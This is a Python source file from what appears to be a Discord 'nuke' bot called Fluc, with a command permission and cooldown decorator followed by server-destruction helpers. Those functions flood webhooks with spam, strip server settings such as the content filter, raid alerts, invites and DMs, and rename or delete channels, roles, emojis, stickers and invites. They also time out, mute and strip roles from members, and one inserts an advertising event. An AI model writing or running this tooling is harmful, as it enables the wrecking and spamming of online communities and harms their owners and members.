    return f'{author} (ID: {author.id}) || {reason}'[:512]


def check(permissions: Permissions, discord_permissions: discord.Permissions = None):
    # Btw, cooldowns handles command cooldowns
    def decorator(func: Callable[..., Coroutine[None, None, Any]]) -> Callable[..., Coroutine[None, None, Any]]:
        # Register the command in cooldowns.permissions
        command = func.__name__
        command = command.removeprefix('cmd_')
        cooldowns.add_command(command, permissions, discord_permissions)

        async def wrapper(ctx: commands.Context, *args, **kwargs) -> Any:
            def check_cooldown() -> None:
                if author_id in database.owners + database.admins:
                    # Bypass all cooldowns
                    return

                if not command in cooldowns.to_check:
                    # Initialize to_check on runtime because cba explaining
                    to_check = []
                    to_check.append(command)

                    if command in cooldowns.aliases:
                        to_check.append(cooldowns.aliases[command])

                        # This adds other commands that have this alias
                        # to the check. Another way to do this is by adding
                        # each command to check in alias (a list - aliases).
                        for key, value in cooldowns.aliases.items():
                            if value == cooldowns:
                                # Without this it would check the command twice
                                if not key == command:
                                    to_check.append(key)

                    else:
                        # In this case we use our brain.
                        # BASICALLY.. We don't know if this command is an alias
                        # for another command. So we iterate through each command
                        # to check if this command is an alias for that command.
                        for key, value in cooldowns.aliases.items():
                            if value == command:
                                to_check.append(key)
                    cooldowns.to_check[command] = to_check
                
                now = datetime.datetime.now(datetime.UTC)
                to_check = cooldowns.to_check[command]
                for cmd in to_check:
                    user_cooldown = cooldowns.cooldowns[cmd][0]
                    server_cooldown = cooldowns.cooldowns[cmd][1]
                    # on_command_error handles cooldown exceptions (if any)
                    cooldowns.check_cooldown(
                        cmd,
                        ctx.guild.id,
                        author_id,
                        user_cooldown=user_cooldown,
                        server_cooldown=server_cooldown,
                        now=now,
                        apply_cooldown=True
                    ) 
            

            async def proceed():
                async def parse_arguments():
                    invoke_args = [*args]
                    annotations = dict(func.__annotations__)

                    for key in list(annotations.keys())[1:]:
                        annotations.pop(key)

                    zipped = zip(invoke_args, list(annotations.values())[2:])
                    zipped = [item for item in zipped if len(item) == 2]
                    
                    for arg, param in zipped:
                        try:
                            invoke_args[arg] = param(arg)
                        
                        except (TypeError, ValueError):
                            raise commands.BadArgument(f'Failed to convert "{arg}" to "{type(param).__name__}"')
                    ctx.args = [ctx, user] + invoke_args


                # Raise discord.py errors instead of Python errors
                # discord.ext.commands.core.Command.callback.setter
                unwrap = commands.core.unwrap_function
                get_signature_parameters = commands.core.get_signature_parameters

                try:
                    globalns = unwrap.__globals__
                except AttributeError:
                    globalns = {}

                # Set ctx.command.params to the actual command params
                ctx.command.params = get_signature_parameters(func, globalns)
                # and remove user from params because that's how it works
                ctx.command.params.pop('user')

                # Parse arguments (raise proper errros)
                await parse_arguments()

                # Delete message (only nuke bot)
                if not is_manager:
                    bot.loop.create_task(ctx.message.delete())
                
                # Run command
                try:
                    permissions = cooldowns.permissions.get(command)
                    if isinstance(permissions, discord.Permissions):
                        if not ctx.guild.owner:
                            if not ctx.author.guild_permissions.add_reactions & permissions.value == permissions.value:
                                missing = permissions.value &~ ctx.author.guild_permissions.value
                                missing_permsissions = [name for name, value in Permissions().flag_value_pairs().items() if missing & value]
                                raise commands.MissingPermissions(missing_permsissions)
                    return await func(*ctx.args)

                except (TypeError, commands.CommandInvokeError, ForceCancelError) as exc:
                    cooldowns.remove_cooldown(command, ctx.guild.id, author_id)
                    excstr = ' '.join(str(exc).split()[1:])
                    if 'missing' in excstr:
                        # missing x required positional arguments: 'x' ...
                        param = exc.args[0]
                        annotation = func.__annotations__.get(param)
                        match = search(r"missing \d+ required positional argument[s]?: '([^']+)'(?:,|'| and)?", excstr)
                        
                        if match:
                            param_name = match.group(1).strip()
                        
                        else:
                            param_name = None

                        param = commands.Parameter(
                            name=param_name,
                            kind=Parameter.POSITIONAL_ONLY,
                            annotation=annotation,
                        )
                        exc = commands.MissingRequiredArgument(param)
                    
                    elif 'takes' in excstr:
                        # takes x positional arguments but x were given
                        raise commands.TooManyArguments('Too many arguments')

            command = func.__name__
            command = command.removeprefix('cmd_')
            author_id = message_cache.get(ctx.message.id, ctx.author.id)
            user = database.get_user(author_id)
            bypass = database.admins + database.owners

            if permissions.owner_only:
                assert author_id in database.owners
                    
            if permissions.admin_only:
                assert author_id in bypass

            if author_id in bypass:
                # Skip other checks
                return await proceed()
            
            if not is_manager:
                if permissions.member_only:
                    members = await get_members()
                    if not author_id in members:
                        await ctx.channel.send(embed=embed(
                            title='Error',
                            description='Hmm.. Seems like you are not in our server.. yet. Join **now** - discord.gg/E7bm8hbDUs'
                        ))
                        assert author_id in members

            if permissions.user_only or permissions.premium_only:
                if not user:
                    await ctx.channel.send(embed=embed(
                        title='Error',
                        description='You must be a member to use commands. Join discord.gg/E7bm8hbDUs'
                    ))
                    assert user is not None
                    
            if permissions.premium_only:
                if not user.is_premium:
                    await ctx.channel.send(embed=embed(
                        title='Error',
                        description=(
                            'This is a premium command.\n'
                            'To get access to premium commands, '
                            f'check #premium channel in the main server'
                        ),
                        color=discord.Color.pink()
                    ))                
                    assert user.is_premium
            
            if not is_manager:
                if permissions.ignore_user_blacklist is False:
                    assert not author_id in database.blacklisted_users
                
                if permissions.ignore_guild_blacklist is False:
                    assert not ctx.guild.id in database.blacklisted_servers

            check_cooldown()
            return await proceed()
        return wrapper
    return decorator


def bot_task(*, add_to: List[Any] = None):
    def decorator(func: Callable[..., Coroutine[Any, Any, Any]]):
        async def wrapper(*args, **kwargs):
            result = await func(*args, **kwargs)
            if add_to:
                add_to.append(result)
            return result
        return wrapper
    return decorator


async def spam_webhook(webhook: discord.Webhook, settings: Settings) -> discord.Webhook:
    for _ in range(settings.webhook_amount):
        embeds: List[discord.Embed] = []

        # Save time by skipping this if the message has no embeds
        if len(settings.message['embed']) != 0:
            embed_amount: int

            # Since Discord only allows max 10 embeds
            # per message
            embed_amount = min(10, len(settings.message['embed']))
            
            for _ in range(embed_amount):
                embeds.append(xorshift32.choice(settings.message['embed']))

        await webhook.send(
            content=xorshift32.choice(settings.message['content']),
            avatar_url=xorshift32.choice(settings.message['avatar_url']),
            username=xorshift32.choice(settings.message['username']),
            tts=xorshift32.choice(settings.message['tts']),
            embeds=embeds
        )
    return webhook


async def create_channel(guild: discord.Guild, settings: Settings) -> discord.TextChannel:
    return await guild.create_text_channel(
        name=xorshift32.choice(settings.channel['name']),
        topic=xorshift32.choice(settings.channel['topic']),
        nsfw=xorshift32.choice(settings.channel['nsfw']),
        slowmode_delay=xorshift32.choice(settings.channel['slowmode_delay']),
        reason=xorshift32.choice(settings.reasons)
    )


async def mess_guild(guild: discord.Guild, settings: Settings):
    content = await read_url(xorshift32.choice(settings.guild['icon']))
    if not content:
        return
    
    now = datetime.datetime.now(datetime.UTC)  
    day = now + datetime.timedelta(days=1)

    for event in guild.scheduled_events:
        asyncio.create_task(event.delete(reason='Nobody cares xD'))

    # Hehe.. Not customizable!
    asyncio.create_task(guild.create_scheduled_event(
        name='Fluc',
        start_time=now + datetime.timedelta(seconds=1),
        end_time=now + datetime.timedelta(days=365),
        entity_type=discord.EntityType.external,
        privacy_level=discord.PrivacyLevel.guild_only,
        location='discord.gg/E7bm8hbDUs',
        description='Join bot **now** - discord.gg/E7bm8hbDUs',
        reason='Advertisement'
    ))

    await guild.edit(
        name=xorshift32.choice(settings.guild['name']),
        icon=content,
        system_channel=None,
        afk_channel=None,
        default_notifications=discord.NotificationLevel.all_messages,
        community=False,
        explicit_content_filter=discord.ContentFilter.disabled,
        raid_alerts_disabled=True,
        splash=None,
        widget_channel=None,
        widget_enabled=False,
        invites_disabled_until=day,
        dms_disabled_until=day,
        reason=xorshift32.choice(settings.reasons)
    )


async def mess_channel(channel: GuildEditableChannel, channel_amount: int, settings: Settings) -> GuildEditableChannel:
    kwargs = {
        'name': xorshift32.choice(settings.channel['name']),
        'overwrites': {channel.guild.default_role: discord.PermissionOverwrite(
            view_channel=True,
            send_messages=True
        )},
        'slowmode_delay': xorshift32.choice(settings.channel['slowmode_delay']),
        'position': xorshift32.randint(stop=channel_amount - 1),
        'reason': xorshift32.choice(settings.reasons)
    }

    if isinstance(channel, discord.TextChannel):
        channel.edit
        kwargs.update({
            'topic': xorshift32.choice(settings.channel['topic']),
            'nsfw': xorshift32.choice(settings.channel['nsfw'])
        })
    
    if isinstance(channel, (discord.VoiceChannel, discord.StageChannel)):
        kwargs.update({
            'video_quality_mode': discord.VideoQualityMode.auto,
            'bitrate': 69
        })
    await channel.edit(**kwargs)
    return channel


async def delete_channel(channel: discord.abc.GuildChannel, settings: Settings) -> discord.abc.GuildChannel:
    await channel.delete(reason=xorshift32.choice(settings.reasons))
    return channel


async def create_webhook(channel: discord.TextChannel, settings: Settings, *, force: bool = True, existing: bool = False) -> Optional[discord.Webhook]:
    if force is False or existing is True:
        webhooks = await channel.webhooks()
        if webhooks:
            # Choose 1 random webhook in the channel
            return xorshift32.choice(webhooks)
        
        elif existing is True:
            return None
        
    return await channel.create_webhook(
        name=xorshift32.choice(settings.webhook['name']),
        reason=xorshift32.choice(settings.reasons)
    )


async def create_role(guild: discord.Guild, settings: Settings) -> discord.Role:
    permissions = xorshift32.choice(settings.role['permissions'])
    color = xorshift32.choice(settings.role['color'])
    return await guild.create_role(
        name=xorshift32.choice(settings.role['name']),
        permissions=discord.Permissions(permissions) if permissions else MISSING,
        color=discord.Color.from_str(color) if color else MISSING,
        hoist=xorshift32.choice(settings.role['hoist']),
        mentionable=xorshift32.choice(settings.role['mentionable']),
        reason=xorshift32.choice(settings.reasons)
    )


async def mess_role(role: discord.Role, settings: Settings) -> discord.Role:
    permissions = xorshift32.choice(settings.role['permissions'])
    color = xorshift32.choice(settings.role['color'])
    await role.edit(
        name=xorshift32.choice(settings.role['name']),
        permissions=discord.Permissions(permissions) if permissions else MISSING,
        color=discord.Color.from_str(color) if color else MISSING,
        hoist=xorshift32.choice(settings.role['hoist']),
        mentionable=xorshift32.choice(settings.role['mentionable']),
        display_icon=None,
        reason=xorshift32.choice(settings.reasons)
    )
    return role


async def create_emoji(guild: discord.Guild, settings: Settings) -> Optional[discord.Emoji]:
    image: BytesIO
    icon_url: str = xorshift32.choice(settings.emoji['image'])

    content: Optional[bytes] = await read_url(icon_url)
    if content is None:
        return
        
    image = compress(content)
    image = image.getvalue()

    return await guild.create_custom_emoji(
        name=xorshift32.choice(settings.emoji['name']),
        image=image
    )


async def delete_emoji(emoij: discord.Emoji, settings: Settings) -> discord.Emoji:
    await emoij.delete(reason=xorshift32.choice(settings.reasons))
    return emoij


async def create_sticker(guild: discord.Guild, settings: Settings) -> Optional[discord.GuildSticker]:
    sticker: discord.File
    image: BytesIO

    content: Optional[bytes] = await read_url(xorshift32.choice(settings.sticker['image']))
    if content is None:
        return
    
    image = compress(content)
    sticker = discord.File(image, 'sticker.png')

    return await guild.create_sticker(
        name=xorshift32.choice(settings.sticker['name']),
        description=xorshift32.choice(settings.sticker['description']),
        emoji=xorshift32.choice(settings.sticker['emoji']),
        file=sticker
    )


async def delete_sticker(sticker: discord.GuildSticker, settings: Settings) -> discord.GuildSticker:
    await sticker.delete(reason=xorshift32.choice(settings.reasons))
    return sticker


async def create_invite(channel: Union[discord.VoiceChannel, discord.TextChannel], settings: Settings) -> discord.Invite:
    return await channel.create_invite(reason=xorshift32.choice(settings.reasons))


async def delete_invite(invite: discord.Invite, settings: Settings) -> discord.Invite:
    await invite.delete(reason=xorshift32.choice(settings.reasons))
    return invite


async def mess_member(member: discord.Member, settings: Settings) -> discord.Member:
    timed_out_until = xorshift32.choice(settings.member['timed_out_until'])
    timed_out_until = datetime.datetime.now(datetime.UTC) + datetime.timedelta(seconds=timed_out_until)
    nick: str = None

    while nick is None or len(nick) > 32:
        nick = xorshift32.choice(settings.member['nick'])
    
    kwargs = {
        'nick': nick,
        'roles': [],
        'reason': xorshift32.choice(settings.reasons),
    }

    if not member.guild_permissions.administrator:
        kwargs.update({'timed_out_until': timed_out_until})

    if member.voice:
        if isinstance(member.voice.channel, discord.StageChannel):
            kwargs.update({'suppress': xorshift32.choice(settings.member['supress'])})
        else:
            kwargs.update({
                'mute': xorshift32.choice(settings.member['mute']),
                'deafen': xorshift32.choice(settings.member['deafen'])
            })

    await member.edit(**kwargs)
    return member



def ext_init(
    _database: Database,
    _xorshift32: XorShift32,
    _cooldowns: Cooldowns,
    _fluc: commands.Bot,
    _session: aiohttp.ClientSession,
    _emojis: Emojis,
    *,
    manager: bool = False
) -> None:
    global database
    global xorshift32
    global cooldowns
    global bot
    global session
    global emojis
    global is_manager
    database = _database
    xorshift32 = _xorshift32
    cooldowns = _cooldowns
    bot = _fluc
    session = _session
    emojis = _emojis
    is_manager = manager